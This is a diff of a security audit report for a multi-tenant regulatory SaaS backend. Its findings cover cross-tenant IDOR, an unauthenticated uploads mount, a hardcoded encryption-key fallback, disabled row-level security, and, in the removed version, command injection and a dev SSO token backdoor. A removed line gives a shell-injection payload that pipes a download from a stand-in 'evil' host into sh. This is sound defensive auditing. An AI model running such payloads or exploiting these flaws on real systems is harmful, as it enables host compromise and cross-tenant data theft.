@@ -1,271 +1,209 @@
 # GA Readiness Audit — Security & Authentication
 
+**Scope:** `server/` and `shared/` (application/server code only). Excludes `client/` and raw DB migrations/schema, per audit charter.
 **Date:** 2026-06-14
-**Scope:** `server/` and `shared/` application code (auth, middleware, security-relevant routes). React client and raw DB schema/migrations out of scope.
-**Method:** Net-new independent source review. No prior reports consulted.
+**Auditor focus:** Auth flows (JWT/SAML/session/dev-auth), multi-tenant isolation, secrets, injection (SQL/command/path/SSRF), CSRF, file uploads, RBAC/IDOR, crypto, rate limiting, input validation.
+**Method:** Net-new independent review from source, augmented by two focused sub-audits (injection sweep; exhaustive RBAC/IDOR route sampling across ~300 route files). Findings verified by reading actual code; cited as `file:line`. Prior audit/markdown reports in the repo were deliberately not consulted.
 
 ---
 
 ## Executive Summary
 
-**Verdict: NOT READY (conditional — clears to Ready once the two HIGH findings are fixed).**
-Full summary with severity counts is repeated at the end of this document.
+The platform's **perimeter and primitive security is mature**: hardened JWT verification, fail-closed SAML, centralized dev-auth gating, strong password/MFA/login-lockout, strict CORS/CSP, and a global `/api` authentication gate. The most damaging *perimeter* vulnerability classes are already remediated, with visible fix markers and a large battery of CI guards.
 
-- **BLOCKER:** 0 · **HIGH:** 2 · **MEDIUM:** 3 · **LOW:** 2
-- **Top blockers:** (1) post-auth OS command injection in `/api/analytics/upload-protocol`;
-  (2) dev SSO backdoor minting valid JWTs, gated only on `NODE_ENV`.
-- The auth/tenant-isolation core is otherwise strong (HS256-pinned JWT + rotation,
-  fail-closed SAML, JWT-derived tenant context, bcrypt-12 + lockout, hashed SCIM tokens,
-  allowlist CORS, double-submit CSRF, parameterized SQL, no hardcoded prod secrets).
+**However, the audit found a cluster of post-authentication broken-object-level-authorization (IDOR) vulnerabilities that allow cross-tenant data access and cross-tenant regulatory mutations.** The global auth gate ensures a request is *authenticated*, but several legacy clinical-ops and FDA-510k route handlers fetch sensitive objects by an ID taken straight from `req.params`/`req.body` **without scoping to the caller's organization**. In a multi-tenant regulated SaaS, these are launch-blocking: any logged-in customer can read another customer's enrollment data, protocol deviations, and FDA project data, and in some cases transmit another tenant's submission to FDA. This is compounded by the fact that **Postgres Row-Level Security ships in shadow mode (off) by default**, so there is currently no database safety net behind the application-layer scoping bugs.
+
+Sub-audit results folded in:
+- **SQL/command injection:** clean. Queries use Drizzle parameterization / `pool.query($1)`; reviewed `sql\`\`` interpolations are bound parameters; the lone string-interpolated identifiers come from `information_schema`, not user input. No command-injection sinks with user-controlled args.
+- **RBAC/IDOR:** the source of the BLOCKERs below.
+
+### Findings by severity
+
+| Severity | Count |
+|----------|-------|
+| BLOCKER  | 6 |
+| HIGH     | 2 |
+| MEDIUM   | 6 |
+| LOW      | 5 |
+
+### Verdict: **NOT READY**
+
+Cross-tenant IDOR on clinical and regulatory data (B-1…B-4) is a direct confidentiality/integrity breach for paying enterprise tenants, and the unauthenticated `/uploads` mount (B-5) plus the hardcoded credential-vault key (B-6) compound it. These must be fixed and regression-tested before GA. Once the BLOCKERs are closed (and ideally RLS flipped to enforce as a backstop — H-1), the perimeter is strong enough to reach CONDITIONAL.
 
 ---
 
-## Findings
+## BLOCKER
 
-### [HIGH] OS command injection via uploaded protocol content (`/api/analytics/upload-protocol`)
+### B-1. Cross-tenant IDOR in clinical-operations study sub-resources (read)
 
-**File:** `server/routes/analytics-routes.ts:88,128,148-150,285,308-310`
-
-`extractedText` — derived from an attacker-uploaded PDF/document — is interpolated
-directly into a shell command string and run through `child_process.exec`:
-
+**Evidence:** `server/routes/clinical-operations-routes.ts` — multiple GET handlers fetch child tables by `studyId` from `req.params` with **no organization scoping**, even though a `getOrgId(req)` helper exists (line 93) and *is* used in the corresponding write/delete handlers.
 ```ts
-const result = await execPromise(`python ${analyzerScriptPath} "${extractedText}"`);   // line 128
+// :studyId/enrollment — line 527-534
+router.get('/studies/:studyId/enrollment', async (req, res) => {
+  const { studyId } = req.params;
+  const result = await pool.query(
+    `SELECT * FROM clinical_ops.enrollment_records WHERE study_id = $1 ORDER BY period`,
+    [studyId]);            // ← no org check
 ```
-and
+Same pattern on: `:studyId/enrollment-forecast` (~line 841), `:studyId/monitoring-visits` (~line 601), `:studyId/deviations` (~line 684 — protocol violations, highly sensitive), `:studyId/milestones` (~line 768).
+
+**Why it blocks GA:** Any authenticated user enumerates numeric study IDs and reads another tenant's enrollment numbers, site-monitoring findings, and protocol deviations. Direct cross-tenant PHI/regulatory-data confidentiality breach.
+
+**Fix:** Scope every read through the parent study with `getOrgId(req)`, e.g. `WHERE study_id = $1 AND study_id IN (SELECT id FROM clinical_ops.studies WHERE org_id = $2)` — the write paths already do this.
+
+### B-2. Cross-tenant IDOR in FDA ESG submission (irreversible regulatory mutation)
+
+**Evidence:** `server/routes/esgSubmissionRoutes.ts:14` → `server/services/ESGSubmissionService.ts:121-136`. `POST /api/510k/:projectId/esg/submit` passes the JWT-derived `organizationId` into `submitToFDA`, but `createSubmissionPackage` fetches the project/documents by `projectId` only (`.where(eq(fda510kProjects.id, projectId))`, line 136) — org is never used to authorize project access.
+
+**Why it blocks GA:** A user in org A can transmit org B's project to FDA (an irreversible external regulatory action) by guessing/enumerating `projectId`.
+
+**Fix:** Add `AND organization_id = <jwtOrg>` to the project/document lookup; 404 if it doesn't belong to the caller's org.
+
+### B-3. Cross-tenant IDOR + body-supplied tenant in 510k workflow save (write)
+
+**Evidence:** `server/routes/510k-workflow-routes.ts:21-96`. `POST /:projectId` reads `organizationId` from **`req.body`** (line 23) and writes it as the owner of new `fda510kProjects` rows (line 89); project lookup and `fda510kStageProgress` upserts are scoped by `projectId` only (lines 79-82, 121-170).
+
+**Why it blocks GA:** An authenticated user writes/poisons workflow stage data into ANY project regardless of tenant, and self-assigns tenant ownership of new rows via the body field — cross-tenant write + tenant-claim forgery.
+
+**Fix:** Never read `organizationId` from the body; derive it from `req.user`/JWT. Scope the project lookup and all upserts by the JWT org.
+
+### B-4. Cross-tenant IDOR in FDA form generation/export
+
+**Evidence:** `server/routes/fda-forms.routes.ts:118` → `fetchProjectData` (line 541-548). `POST /project/:projectId/generate/:formType` computes `organizationId` (line 121) but never uses it; `fetchProjectData(projectId)` resolves the project and even derives the org *from the project row* (line 565). Same gap on the other handlers calling `fetchProjectData` (~lines 225, 254, 338).
+
+**Why it blocks GA:** Generate/export FDA forms populated with another tenant's device and project data by changing `projectId`.
+
+**Fix:** Pass the JWT org into `fetchProjectData` and require the project's `organization_id` to match; 404 otherwise.
+
+### B-5. Unauthenticated `/uploads` static mount
+
+**Evidence:** `server/bootstrap/register-inline-routes.ts:225` — `app.use('/uploads', express.static('/tmp/uploads'))`. Mounted **outside `/api`**, so the global auth gate never runs; every file under `/tmp/uploads` is downloadable with no auth and no tenant scoping. Document/export services write here, and some filenames are predictable (e.g. `${formType}_${projectId}_${timestamp}`).
+
+**Why it blocks GA:** If regulatory PDFs / generated forms / PHI land in this directory, they are world-readable to anyone who can reach the host. (Verify exactly what is written to `/tmp/uploads`; if strictly transient non-sensitive assets, downgrade to HIGH.)
+
+**Fix:** Serve tenant files through an authenticated, org-scoped controller (or short-lived signed URLs); never raw `express.static` for tenant content.
+
+### B-6. Hardcoded AES key fallback in the integration credential vault (no production guard)
+
+**Evidence:** `server/services/integrations/credentialVault.ts:21`
 ```ts
-`python -c "... open('${tempScoreFile}', 'r')...` // line 149 (filePath/text interpolated)
+const raw = process.env.INTEGRATION_CREDENTIAL_ENCRYPTION_KEY
+  || process.env.AUDIT_SIGNING_KEY
+  || 'dev-integration-credential-key-change-me';
 ```
+This vault encrypts **tenant integration credentials** with AES-256-GCM. If neither env var is set, the key is derived from a constant baked into source — anyone with the repo/bundle can decrypt every stored tenant credential. Unlike `connector-registry.ts` (which throws in production when no key is set), this module has **no `NODE_ENV==='production'` guard**.
 
-`exec` invokes `/bin/sh -c`, so any shell metacharacter in the extracted text
-(`"; curl evil | sh; "`, `` $(...) ``, backticks) executes arbitrary commands on
-the application host with the server's privileges. The file path at line 88/285
-(`"${filePath}"`) is multer-generated and lower-risk, but the *content* path is fully
-attacker-controlled.
+**Why it blocks GA:** A publicly-known default key defeats the encryption of stored customer secrets; an env-unset prod deploy silently uses it.
 
-**Reachability:** The global `/api` auth gate (`register-platform-routes.ts:235`)
-is registered before this router is mounted (`startup/routes.ts:89` precedes the
-analytics mount at `register-project-routes.ts:88-94`), so the endpoint requires a
-valid session. This is therefore a **post-authentication RCE**: any authenticated
-tenant user (lowest role) can execute code on the host and pivot to other tenants'
-data, secrets, and the database. In a regulated multi-tenant SaaS this is a host
-compromise / cross-tenant breach vector.
-
-**Why it blocks GA:** Authenticated RCE on shared infrastructure breaks tenant
-isolation at the OS level and is a critical control gap for SOC 2 / regulated launch.
-
-**Fix:** Never build shell strings from input. Use `execFile`/`spawn('python3',
-[script, filePath])` with an argument array (no shell), pass the document via a temp
-file or stdin rather than as an argv string, and validate/normalize file paths. Remove
-the `python -c "...open('${...}')..."` construction entirely in favor of a script file
-that reads a path argument.
+**Fix:** Throw in `getEncryptionKey()` when `NODE_ENV==='production'` and no real key is set (mirror `connector-registry.ts:48-53`). Add a CI ban on the literal fallback in non-dev paths.
 
 ---
 
-### [HIGH] Dev SSO backdoor mints valid production JWTs, gated only on `NODE_ENV`
+## HIGH
 
-**File:** `server/routes/sso.ts:19,422-471` (mounted at `register-platform-routes.ts:167-170`)
+### H-1. Postgres RLS ships in shadow mode (off) by default — no DB safety net behind the IDOR bugs
 
-The generic SSO provider routes contain a development bypass:
+**Evidence:**
+- `server/db/rlsEnforcement.ts` — `readEnforcementMode()` defaults to `'off'` unless `RLS_ENFORCE=on`; `assertRlsEnforcementForProduction()` only **warns** in production, hard-failing only if the operator sets `RLS_REQUIRE_ENFORCE=true`.
+- `migrations/0021_enable_rls_everywhere.sql` — policy leading clause is a shadow bypass: `NULLIF(current_setting('app.rls_enforce', TRUE),'') IS DISTINCT FROM 'on'` → every row passes unless the var is `'on'`.
+- `server/middleware/tenantContext.ts:294-296`, `server/db/requestDb.ts:13-16`, `server/db/poolInstrumentation.ts` — rollout is mid-flight ("PR A" counts unscoped queries; "PR B" turns on enforcement). The `ci:tenant-isolation` baseline tracks **28** query sites running outside any tenant scope (`docs/reports/tenant-isolation-baseline.json`).
 
-```ts
-const isDev = process.env.NODE_ENV === 'development';   // line 19
-...
-router.get('/:provider/initiate', ...) { if (isDev) { /* redirect with dev code */ } }
-router.get('/:provider/callback', ...) {
-  if (isDev) {
-    const token = jwt.sign({ userId:'1', email:'sso-user@example.com',
-      organizationId:'2', role:'client_user', provider }, config.jwt.secret, {expiresIn:'24h'});
-    return res.redirect(302, `/concept2cure/login?...&sso_token=${token}...`);   // line 460-467
-  }
-}
-```
+**Why it's HIGH:** RLS is the defense-in-depth layer that would have *contained* B-1…B-4. With it off, every app-layer scoping bug is a live cross-tenant breach. The code intentionally treats app-layer scoping as primary, but the IDOR findings prove that single layer is not currently reliable.
 
-This issues a **fully valid, signed JWT** for org `2` / user `1` to anyone who hits
-`GET /api/auth/sso/<anything>/callback` whenever `NODE_ENV === 'development'`. It is
-mounted unconditionally in all environments and gated *only* on `NODE_ENV`, not on the
-project's hardened `isDevAuthAllowed()` gate (`server/auth/dev-auth-policy.ts`, which
-requires `NODE_ENV==='development' && ALLOW_DEV_AUTH==='1'`). The repo even ships a CI
-check (`ci:no-dev-auth-in-prod`) precisely to catch this pattern, but this route does
-not use the policy helper.
+**Fix:** Set `RLS_ENFORCE=on` in production, verify with `scripts/db-verify/verify-rls.ts` + the tenant-isolation contract tests, burn down the 28 baseline unscoped sites (route them through `requestDb(req)`/`requireTenantContext`), then set `RLS_REQUIRE_ENFORCE=true` so a regression fails the boot.
 
-**Why it blocks GA:** A misconfigured deploy (NODE_ENV unset/typo handled elsewhere,
-or a staging box left at `development`) turns an unauthenticated GET into a tenant
-login. The `/api/auth/*` prefix is on the auth-gate openlist, so these routes are
-reachable **without authentication**. Auth-bypass backdoor reachable by env
-misconfiguration is a launch blocker.
+### H-2. SAML JIT provisioning assigns every new user to a hardcoded organization (org 1)
 
-**Fix:** Gate both `isDev` branches behind `isDevAuthAllowed()` (the existing helper),
-or delete the dev SSO mock entirely and return `501` in all environments until real
-OAuth is implemented. Add the route to the `ci:no-dev-auth-in-prod` scan coverage.
+**Evidence:** `server/routes/sso.ts:491-578` (`findOrCreateSamlUser`) — new JIT users (and existing users with no association, line 509) are placed into `defaultOrgId = 1` regardless of which tenant's IdP authenticated them. The org is not derived from the validated SAML config.
+
+**Why it's HIGH:** In a multi-tenant deployment serving multiple IdPs (`SAML_TENANTS`), a user authenticating via Org B's IdP is provisioned into Org 1 — a cross-tenant membership grant. The assertion is verified (no auth bypass), but the *tenant mapping* is wrong.
+
+**Fix:** Map the JIT user to the org owning the SAML config used for the callback (`orgSlug` from RelayState already identifies it); reject if it doesn't resolve. Add a test asserting JIT users land in the IdP's org.
 
 ---
 
-### [MEDIUM] SAML JIT provisioning hard-codes default org (cross-org placement risk)
+## MEDIUM
 
-**File:** `server/routes/sso.ts:509,555,553-562` and `:226-227`
+### M-1. Forgeable actor identity in audit trails (21 CFR Part 11 integrity)
 
-JIT-provisioned SAML users are unconditionally placed into `organizationId = 1`
-(`defaultOrgId = 1`, line 555) and existing users with no org association also fall back
-to org `1` (line 509). The org slug used to select the IdP trust anchor comes from
-untrusted `RelayState` (lines 226-227) — which is correctly defended for *signature
-validation* (a forged response can't validate against any org's cert), but the
-**resulting user is still mapped to org 1 regardless of which org's IdP authenticated
-them**. In a multi-tenant deployment serving several orgs via `SAML_TENANTS`, a user
-authenticated by Org B's IdP is provisioned into Org A (id 1).
+**Evidence:** Many handlers take the actor from `req.headers['x-user-id']` / `req.body.created_by` and write it into audit / `createdBy` / `submittedBy` fields: `esgSubmissionRoutes.ts:17`, `510k-workflow-routes.ts:43,190,225`, `fda-forms.routes.ts:122,225,254,338`, `authoring.router.ts` (931,1059,1100,1221,1289,1327,1400,…), `document-data-center.ts:18,99`. Org authority is JWT-bound (so not a tenant bypass), but a user can attribute consequential actions — including FDA submissions and document authorship — to another user or `system`.
 
-**Why it matters for GA:** Incorrect tenant assignment on SSO is a cross-tenant data
-exposure / authorization defect for enterprise SSO customers.
+**Fix:** Derive actor identity from `req.user`, never from the header/body.
 
-**Fix:** Derive the target organization from the validated org slug (map slug → org id)
-rather than a hard-coded constant, and reject provisioning when the slug doesn't map to
-a known org. Add a contract test that an Org-B assertion never lands a user in Org A.
+### M-2. Redis rate limiter fails open
 
----
+**Evidence:** `server/middleware/redisRateLimiter.ts:454-461` — on limiter error, `next()` lets the request through unthrottled; Redis-down degrades to per-instance in-memory counting (per-node limits multiply). Login is independently protected by a dedicated `loginLimiter` (10/15 min, `auth.ts:101-111`) + DB account lockout, so brute-force stays bounded; the fail-open mainly weakens volumetric abuse throttling.
 
-### [MEDIUM] SAML/SSO returns JWT in URL query string (token leakage)
+**Fix:** Fail-closed (429) for sensitive categories (auth, export) on limiter error, or alert on degradation.
 
-**File:** `server/routes/sso.ts:283-288,460-467`
+### M-3. `authenticateToken` trusts the JWT org claim without per-request membership revalidation
 
-After SAML callback, the access token is appended to the same-origin `returnTo` path as
-a **query parameter** (`?token=...`, line 285-287); the dev SSO callback likewise puts
-`sso_token` in the redirect URL (line 462). Tokens in URLs leak via browser history,
-`Referer` headers to any third-party resource on the landing page, server access logs,
-and proxy logs. The code comment at line 459 claims "URL fragment ... not query string
-for security," but the implementation uses a query string.
+**Evidence:** `server/middleware/auth.ts:78-117` sets `req.user.organizationId` from the decoded JWT; most route groups mount with `authenticateToken` only (`server/bootstrap/register-*-routes.ts`), unlike `requireTenantContext` which re-checks `organizationUsers` membership and tenant `status` per request. A user removed from an org (or a suspended org) keeps stale access until the 24h token expires.
 
-**Fix:** Deliver the token via a short-lived, `HttpOnly`+`Secure`+`SameSite` cookie or a
-one-time exchange code redeemed by the SPA, not as a URL query parameter. At minimum use
-the URL fragment (`#token=`) as the comment intends, though a cookie/exchange-code is the
-correct GA pattern.
+**Fix:** Standardize sensitive/data routes on `requireTenantContext`, or add token revocation / shorter access-token TTL + refresh.
 
----
+### M-4. SSO `:provider` dev bypass gated only on `NODE_ENV`, not `isDevAuthAllowed()`
 
-### [MEDIUM] Tenant isolation relies on application-level scoping; Postgres RLS not confirmed active
+**Evidence:** `server/routes/sso.ts:19,422-471` — when `NODE_ENV==='development'`, `/:provider/initiate` and `/:provider/callback` mint a real signed JWT (`userId:'1'`, `organizationId:'2'`). Not reachable in prod, but bypasses the stricter `ALLOW_DEV_AUTH=1` requirement and the `ci:no-dev-auth-in-prod` policy that all other dev-auth shortcuts use.
 
-**File:** `server/middleware/tenantContext.ts:272-306` (esp. comment at 293-296)
+**Fix:** Gate behind `isDevAuthAllowed()` (from `server/auth/dev-auth-policy.ts`).
 
-The request DB client sets `app.current_tenant_id` / `app.current_user_role` /
-`app.current_org_id` via `set_config` on a per-request connection, and reviewed routes
-(e.g. `external-evidence.ts:82-138`) consistently filter `WHERE tenant_id = $1`. However
-the in-code comment states the AsyncLocalStorage scope exists to "count which queries run
-without a tenant boundary — the gap that would silently turn into 'zero rows' once RLS is
-enabled in PR B," implying database-enforced RLS may not yet be active in all paths. With
-~hundreds of route files and a single missing `WHERE tenant_id` clause sufficient to leak
-cross-tenant rows, defense-in-depth RLS (`ENABLE/FORCE ROW LEVEL SECURITY` + policies
-keyed on `app.current_tenant_id`) is the control that makes isolation robust against an
-individual query bug.
+### M-5. `connector-registry` encryption falls back to reusing `JWT_SECRET`
 
-**Why it matters for GA:** For regulated multi-tenant data, app-only scoping is a single
-point of failure. RLS must be confirmed enabled and `FORCE`d on every tenant-scoped table
-before GA. (DB schema/migrations are out of this report's scope — flagged for the DB/RLS
-workstream to verify policies are live, not just that `set_config` runs.)
+**Evidence:** `server/services/connectors/connector-registry.ts:56` — `ENCRYPTION_KEY_FROM_ENV || 'default-dev-key-change-in-prod'`; production is guarded, but the documented fallback reuses `JWT_SECRET` as the AES key. Cross-purpose key reuse is a hardening smell.
 
-**Fix:** Confirm RLS is `ENABLE`d and `FORCE`d on all tenant tables with policies matching
-`app.current_tenant_id`; add a CI/integration test that a query with the wrong tenant
-context returns zero rows even when the `WHERE` clause is omitted.
+**Fix:** Require a dedicated `CONNECTOR_ENCRYPTION_KEY`; do not reuse `JWT_SECRET`.
+
+### M-6. `/api/v1` open-prefix and `/api/setup` first-run invariants are unpinned
+
+**Evidence:** `/api/v1` is on the global-gate allowlist and relies on `public-api.ts` enforcing `router.use(requireApiKey)` (present, ~line 261) — but no contract test asserts every `/api/v1/*` route requires a key, so a future route added above that line silently becomes unauthenticated. Separately, `routes/setup.ts` self-closes via a non-transactional `userExists()` check (first-run TOCTOU; small window).
+
+**Fix:** Add a contract test pinning `/api/v1` api-key coverage; wrap first-user bootstrap in a transaction + unique constraint.
 
 ---
 
-### [LOW] `requireTenantContext` precondition checks bare `JWT_SECRET`, mismatching the env-suffixed verifier
+## LOW
 
-**File:** `server/middleware/tenantContext.ts:170-175` vs `server/utils/jwtVerify.ts:40-49`
+### L-1. `/api/diag`, `/api/time` reachable unauthenticated (registered before the gate)
+`registerPlatformRoutes` mounts these before the global `/api` gate; they expose only timestamp/static HTML. Latent footgun: any `app.get('/api/...')` placed before the gate bypasses auth. Keep pre-gate routes minimal and test-pinned.
 
-The middleware returns `503 Authentication unavailable` when `process.env.JWT_SECRET` is
-falsy, but the verifier resolves `JWT_SECRET_<ENV>` (e.g. `JWT_SECRET_PROD`) *first* and
-only falls back to bare `JWT_SECRET`. A production deployment that sets only
-`JWT_SECRET_PROD` (the documented pattern in `config/environment.ts`) would have a working
-verifier yet trip this 503 — a fail-closed availability bug, not a security hole, but it
-contradicts the supported secret layout and could mask real auth during incident response.
+### L-2. SCIM token compare — verify constant-time
+`/scim/v2` (outside `/api`) self-authenticates via its own bearer + IP allowlist. Confirm the token comparison uses `crypto.timingSafeEqual` (not `===`).
 
-**Fix:** Replace the bare-env check with the same resolution the verifier uses (or simply
-let `verifyJwtWithRotation` throw and handle it), so the precondition matches the actual
-secret source.
+### L-3. Firecrawl webhook — confirm fail-closed
+`/api/firecrawl-webhooks` verifies signatures; confirm it **rejects** when its signing secret is unset (Stripe webhooks already verify signatures correctly).
 
----
+### L-4. CSP allows broad `img-src https:` / `connect-src wss:`
+`server/middleware/enterprise-security.ts:219-222`. Acceptable trade-off given varied regulatory imagery; script-src is correctly locked with nonce + strict-dynamic. Tighten if feasible.
 
-### [LOW] Generic `requireRole`/`requirePermission` grant implicit admin/wildcard escalation
-
-**File:** `server/middleware/auth.ts:149-151,217-221`; `server/middleware/tenantIsolation.ts:178-191`
-
-Authorization helpers treat membership of role `admin` as satisfying *any* role/permission
-check (`!userRoles?.includes('admin')`, `req.tenant?.roles.includes('admin')`), and
-`requirePermission` honors a `'*'` wildcard permission. This is conventional, but the
-`admin` role here is the *organization* admin (from `organization_users.role`), so an org
-admin implicitly passes every `requirePermission(...)` gate regardless of the specific
-permission. Ensure no cross-tenant or platform-level capability is guarded solely by a
-generic `requireRole('admin')` that an ordinary tenant admin can satisfy. Platform/super-
-admin actions correctly use the separate `requireSuperAdminRole` (`server/auth.ts:160-166`),
-which is good — this is a hardening note to audit that the two admin tiers are never
-conflated on sensitive routes.
-
-**Fix:** Keep tenant-admin and platform-admin authorities strictly separate; prefer
-explicit permission grants over blanket admin-implies-all on any route that crosses tenant
-or platform boundaries.
+### L-5. SAML logout callback does not validate the IdP `LogoutResponse` signature
+`server/routes/sso.ts:404-414` — acknowledged in-code as a follow-up. Low forgery value (no session created).
 
 ---
 
-## Positive Controls Observed (not blockers)
+## Areas reviewed and found solid (no action required)
 
-- **JWT verification is hardened:** algorithm pinned to HS256 (`jwtVerify.ts:81`) — blocks
-  alg-confusion; zero-downtime rotation with previous-secret fallback; min 32-char secret
-  enforced at config load and fails loud (`config/environment.ts:103-128`).
-- **No hardcoded production secrets** found in `server/`; the only hardcoded credential
-  (`tamper-proof-audit.ts:138`) is a dev-only fallback that *throws* in production
-  (`:125-131`). All real secrets come from `process.env`.
-- **SAML is fail-closed** via `@node-saml/node-saml` with `wantAssertionsSigned: true`,
-  audience pinning, InResponseTo/replay validation, SHA-256 (`saml-provider.ts:115-151`).
-  Replaces a prior regex-based bypass. RelayState is correctly treated as untrusted for
-  trust decisions.
-- **Tenant org id is derived from the verified JWT, never from headers**; header-based
-  impersonation attempts are detected and audit-logged as `critical`
-  (`tenantIsolation.ts:55-73`, `tenantContext.ts`, `tenantAuth.ts`).
-- **CSRF** uses a double-submit cookie with constant-time, fixed-length comparison and a
-  precise exempt-path matcher that avoids prefix-confusion (`csrf.ts`).
-- **CORS** is allowlist-based and blocks unknown origins in all environments; no wildcard
-  with credentials in production (`enterprise-security.ts:312-351`).
-- **Password hygiene:** bcrypt cost 12, legacy `temp_`/empty hashes rejected, account
-  lockout, login rate limiting, password history, audit logging (`auth.ts`, `routes/auth.ts`).
-- **SCIM** uses hashed tokens with constant-time compare, per-org source-IP allowlists,
-  and dedicated rate limiting (`routes/scim.ts`).
-- **SQL** in reviewed routes is parameterized (drizzle / `$1` placeholders); no string-
-  concatenated SQL with request input was found in the security-critical paths reviewed.
-- **Upload allowlist** rejects executable/script extensions and requires magic-byte +
-  malware verification downstream (`uploadAllowlist.ts`).
+- **Global `/api` auth gate** — `server/bootstrap/register-platform-routes.ts:235` forces JWT auth on all `/api/*` except an explicit health/auth/webhook allowlist; mounted before family routers; pinned by `server/bootstrap/__tests__/api-auth-gate.test.ts`.
+- **JWT verify pinning & rotation** — `server/utils/jwtVerify.ts`: `algorithms:['HS256']`; previous-secret fallback only on signature mismatch; secret validated ≥32 chars at config load (`server/config/environment.ts:99-128`).
+- **SAML assertion validation** — `server/services/saml-provider.ts`: vetted `@node-saml/node-saml`, signed-assertion required, audience pinned, InResponseTo/replay, sha256; fail-closed ACS (`server/routes/sso.ts:239-247`).
+- **Dev-auth** — centralized `isDevAuthAllowed()` (NODE_ENV=development AND ALLOW_DEV_AUTH=1), CI-enforced; `/dev-login` returns 404 otherwise; hardcoded login backdoor removed (`server/auth.ts:174`).
+- **Password hygiene & login** — bcrypt cost 12; empty-hash / legacy `temp_` plaintext rejected (`server/auth.ts:266-291`); account lockout (5→30 min); enumeration-safe errors; mandatory MFA by default.
+- **Tenant identity sourcing** — JWT-only; `x-organization-id`/`x-tenant-id`/`x-org-id` overrides detected, blocked, audited (`tenantIsolation.ts`, `tenantContext.ts`, `enterprise-security.ts:487-563`). Canonical helpers `authedOrgId`/`getTenantContext`/`getSecureOrgId` source org from JWT. (Note: the IDOR BLOCKERs are handlers that *fail to call* these helpers, not a weakness in the helpers themselves.)
+- **CORS / CSP / headers** — strict allowlist, no wildcard+credentials in prod; Helmet CSP nonce + strict-dynamic (no unsafe-inline/eval for scripts), HSTS preload, Permissions-Policy deny-by-default.
+- **CSRF** — double-submit cookie, constant-time compare, fixed-length token, anchored exempt-path matching (`server/middleware/csrf.ts`).
+- **Prototype pollution** — `__proto__`/`constructor`/`prototype` stripped from body/query/params, fail-closed (`enterprise-security.ts:417-481`).
+- **Upload allowlist** — extension + MIME allowlist, executable/script types always blocked; layered with magic-number + virus scan (`server/middleware/uploadAllowlist.ts`).
+- **Injection** — SQL parameterized (Drizzle / `$1`); reviewed `sql\`\`` interpolations are bound; no command injection with user-controlled args; the one path-traversal candidate (`reports/subscriptions-routes.ts`) is dead/unmounted code.
+- **Crypto** — AES-256-GCM with per-message random IV; no `createCipher`/ECB/DES/RC4/hardcoded-IV; `crypto.randomBytes` for security tokens.
+- **Audit trail** — tamper-proof HMAC chain fails closed in prod; 21 CFR Part 11 immutability blocks DELETE on audit/esignature routes (`server/startup/middleware.ts:119-155`). (Actor-identity sourcing is the M-1 gap.)
+- **Stripe webhooks** — signature-verified and CSRF-exempt by design.
 
 ---
 
-## Executive Summary
+## Recommended pre-GA gate
 
-**Verdict: NOT READY (conditional on fixing the two HIGH findings).**
-
-The authentication and tenant-isolation core of this platform is, with two notable
-exceptions, well-engineered for a regulated multi-tenant SaaS: HS256-pinned JWT
-verification with rotation, fail-closed SAML via a vetted library, JWT-derived (never
-header-derived) tenant context with re-checked DB membership, bcrypt-12 passwords with
-lockout and rate limiting, hashed SCIM tokens, parameterized SQL, allowlist CORS, and a
-correct double-submit CSRF. No hardcoded production secrets were found.
-
-Two findings block GA:
-
-1. **[HIGH] Post-auth OS command injection** in `/api/analytics/upload-protocol`
-   (`analytics-routes.ts:128,148`): attacker-controlled uploaded-document *content* is
-   interpolated into a `child_process.exec` shell string, giving any authenticated tenant
-   user remote code execution on the shared host — an OS-level break of tenant isolation.
-
-2. **[HIGH] Dev SSO backdoor** (`routes/sso.ts:444-467`) that mints valid signed JWTs and
-   is gated only on `NODE_ENV === 'development'` instead of the project's hardened
-   `isDevAuthAllowed()`. It is mounted unconditionally and reachable unauthenticated under
-   the `/api/auth` open prefix, so an environment misconfiguration becomes an auth bypass.
-
-Both are concrete, env- or input-triggerable, and must be fixed (and covered by the
-existing `ci:no-dev-auth-in-prod` style guards) before launch.
-
-**Count by severity:** BLOCKER 0 · HIGH 2 · MEDIUM 3 · LOW 2.
-
-Conditional path to GA: remediate the two HIGH items (use `execFile`/argv arrays; gate or
-delete the dev SSO mock), confirm Postgres RLS is `FORCE`d on tenant tables (MEDIUM #1),
-fix SAML JIT org mapping and stop returning JWTs in URLs (MEDIUM #2/#3). After those, the
-security/auth posture is GA-ready.
-
-
+1. Fix B-1…B-4 (org-scope every `studyId`/`projectId` lookup; stop reading `organizationId` from request bodies/headers) and add cross-tenant contract tests for each.
+2. Confirm and lock down B-5 (`/uploads`) — authenticated, org-scoped delivery.
+3. Fix B-6 (credential-vault prod key guard).
+4. Flip RLS to enforce (H-1) as the backstop and burn down the 28 unscoped baseline sites; fix H-2 (SAML org mapping).
+5. Address M-1 (audit actor from JWT) for Part 11 integrity, and the remaining MEDIUMs.
